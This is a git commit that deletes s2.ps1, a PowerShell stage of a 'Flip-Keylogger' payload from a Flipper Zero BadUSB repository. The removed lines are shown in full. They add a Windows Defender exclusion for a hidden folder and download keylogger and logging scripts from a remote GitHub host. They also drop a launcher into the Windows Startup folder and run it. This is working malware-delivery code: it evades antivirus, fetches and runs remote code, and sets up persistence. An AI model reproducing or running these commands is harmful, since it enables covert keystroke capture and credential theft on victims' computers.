fe0ffd25e4f5d9084e99e22f58edb65081d03d5c
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-30 22:56:51 -0600

    Delete s2.ps1

--- Payloads/Flip-Keylogger/s2.ps1
+++
@@ -1,8 +0,0 @@
-Add-MpPreference -ExclusionPath $env:appdata/-locker
-
-iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-p.cmd     -o "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
-iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-keys.ps1  -o "$env:appdata\-locker\-keys.ps1" 
-iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-logs.ps1  -o "$env:appdata\-locker\-logs.ps1"
-iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/exit.ps1   -o "$env:appdata\-exit.ps1" 
-
-start-process "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
